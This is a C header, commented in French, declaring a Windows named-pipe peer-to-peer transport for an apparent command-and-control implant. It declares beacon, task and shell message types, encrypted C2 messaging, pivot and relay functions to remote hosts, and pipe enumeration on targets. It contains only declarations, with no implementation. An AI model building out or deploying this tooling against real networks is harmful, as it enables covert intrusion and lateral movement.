/**
 * @file pipe.h
 * @brief Header Named Pipes P2P Transport
 */

#ifndef PIPE_H
#define PIPE_H

#include <windows.h>

// ============================================================================
// TYPES OPAQUES
// ============================================================================

typedef struct _PIPE_SERVER PIPE_SERVER;
typedef struct _PIPE_CLIENT PIPE_CLIENT;

// ============================================================================
// TYPES MESSAGES
// ============================================================================

typedef enum {
    MSG_TASK     = 0x01,
    MSG_RESULT   = 0x02,
    MSG_BEACON   = 0x03,
    MSG_FORWARD  = 0x04,
    MSG_SHELL    = 0x05
} PIPE_MSG_TYPE;

// ============================================================================
// SERVEUR
// ============================================================================

PIPE_SERVER* Pipe_CreateServer(const char* pipe_name, const BYTE* key, DWORD key_len);
BOOL Pipe_WaitForConnection(PIPE_SERVER* server, DWORD timeout_ms);
BOOL Pipe_ServerRead(PIPE_SERVER* server, BYTE* buffer, DWORD buffer_size, DWORD* bytes_read);
BOOL Pipe_ServerWrite(PIPE_SERVER* server, const BYTE* data, DWORD data_len);
BOOL Pipe_ServerDisconnect(PIPE_SERVER* server);
void Pipe_DestroyServer(PIPE_SERVER* server);

// ============================================================================
// CLIENT
// ============================================================================

PIPE_CLIENT* Pipe_Connect(const char* target, const char* pipe_name, 
                          const BYTE* key, DWORD key_len);
BOOL Pipe_ClientRead(PIPE_CLIENT* client, BYTE* buffer, DWORD buffer_size, DWORD* bytes_read);
BOOL Pipe_ClientWrite(PIPE_CLIENT* client, const BYTE* data, DWORD data_len);
void Pipe_Disconnect(PIPE_CLIENT* client);

// ============================================================================
// PROTOCOLE C2
// ============================================================================

BOOL Pipe_SendMessage(HANDLE hPipe, PIPE_MSG_TYPE type, const BYTE* payload, DWORD payload_len,
                      const BYTE* key, DWORD key_len);
BOOL Pipe_RecvMessage(HANDLE hPipe, PIPE_MSG_TYPE* type, BYTE* payload, 
                      DWORD max_len, DWORD* payload_len,
                      const BYTE* key, DWORD key_len);

// ============================================================================
// PIVOT / RELAY
// ============================================================================

BOOL Pipe_Relay(PIPE_SERVER* source, PIPE_CLIENT* dest);
BOOL Pipe_StartRelay(const char* local_pipe, const char* remote_host, 
                     const char* remote_pipe, const BYTE* key, DWORD key_len);

// ============================================================================
// UTILITAIRES
// ============================================================================

BOOL Pipe_Exists(const char* target, const char* pipe_name);
BOOL Pipe_EnumeratePipes(const char* target, char* output, DWORD output_size);

#endif // PIPE_H
